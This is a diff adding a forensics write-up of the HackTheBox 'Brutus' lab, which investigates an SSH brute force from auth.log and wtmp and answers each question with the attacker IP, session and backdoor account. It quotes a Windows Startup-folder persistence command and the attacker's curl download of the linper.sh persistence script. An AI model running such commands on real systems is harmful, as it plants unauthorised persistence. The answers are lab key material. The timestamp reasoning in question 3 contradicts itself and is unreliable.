@@ -3397,3 +3397,94 @@ At the event in Task 14. The answer:
 cmd /k echo [InternetShortcut] > "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virtuoso.url" & echo URL="C:\Users\user\AppData\Local\Immersive Creations Co\Virtuoso.js" >> "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virtuoso.url" & exit
 ```
 > The above command creates a shortcut (`.url`) in folder `Startup`, access directly to a script file (`.js`). When the system start, this `.js` file will automatically execute.
+
+### VI. Brutus:
+> - **Link lab:** https://app.hackthebox.com/sherlocks/Brutus?tab=play_sherlock
+> - **Đề bài:** *In this Sherlock, you will familiarize yourself with Unix `auth.log` and `wtmp` logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using `auth.log`. Although `auth.log` is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.*
+
+#### 1. Analyze the `auth.log`. What is the IP address used by the attacker to carry out a brute force attack?
+In `auth.log`, we see this following line:
+![image](https://hackmd.io/_uploads/H1yLE49WGx.png)
+Answer: `65.2.161.68`
+
+#### 2. The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
+Attacker tried to access to the system by using brute-force attack, we can see this line in `auth.log`:
+![image](https://hackmd.io/_uploads/S1Q9B4c-zx.png)
+Answer: `root`
+
+#### 3. Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the `wtmp` artifact.
+- In `auth.log`, we see this line:
+![image](https://hackmd.io/_uploads/BkezKEqZMg.png)
+- To parse the file `wtmp`, we have to create file `parse.c` in the folder containing `wtmp`:
+``` c
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <utmp.h>
+#include <time.h>
+
+int main() {
+    int fd;
+    struct utmp cr;
+    int reclen = sizeof(struct utmp);
+
+    fd = open("wtmp", O_RDONLY);
+    if (fd == -1) {
+        perror("Cannot open file wtmp");
+        exit(1);
+    }
+
+    printf("%-10s | %-15s | %-20s | %s", "Type", "User", "Host", "Time\n");
+    printf("-------------------------------------------------------------------------\n");
+
+    while (read(fd, &cr, reclen) == reclen) {
+        if (cr.ut_user[0] != '\0') {
+            time_t login_time = cr.ut_tv.tv_sec;
+            char *time_str = ctime(&login_time);
+            
+            if (time_str) {
+                time_str[24] = '\0'; 
+            }
+
+            printf("%-10d | %-15s | %-20s | %s\n", 
+                   cr.ut_type, cr.ut_user, cr.ut_host, time_str);
+        }
+    }
+
+    close(fd);
+    return 0;
+}
+```
+> We can also use the source code `.py` given in `Brutus.zip`:
+- We have the following result:
+![image](https://hackmd.io/_uploads/rJQd_4c-fx.png)
+As we can see, the login time is `2024-03-06 06:32:44` and the authentication time is `2024-03-06 06:32:45`.
+Answer: `2024-03-06 06:32:45`
+
+#### 4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
+In `auth.log`:
+![image](https://hackmd.io/_uploads/SkDhqEq-fl.png)
+Answer: `37`
+
+#### 5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
+We can see this:
+![image](https://hackmd.io/_uploads/S1JMjN9WMl.png)
+Answer: `cyberjunkie`
+
+#### 6. What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
+Searching for `MITRE ATT&CK sub-technique ID used for persistence by creating a new account` on Google and I found this title:
+![image](https://hackmd.io/_uploads/SkVG24qZMl.png)
+> https://attack.mitre.org/techniques/T1136/001/
+
+Answer: `T1136.001`
+
+#### 7. What time did the attacker's first SSH session end according to `auth.log`?
+We can see this line:
+![image](https://hackmd.io/_uploads/BJTp2EcWfx.png)
+Answer: `2024-03-06 06:37:24`
+
+#### 8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
+In `auth.log`, we can see this line:
+![image](https://hackmd.io/_uploads/BJzPTEcZfg.png)
+Answer: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
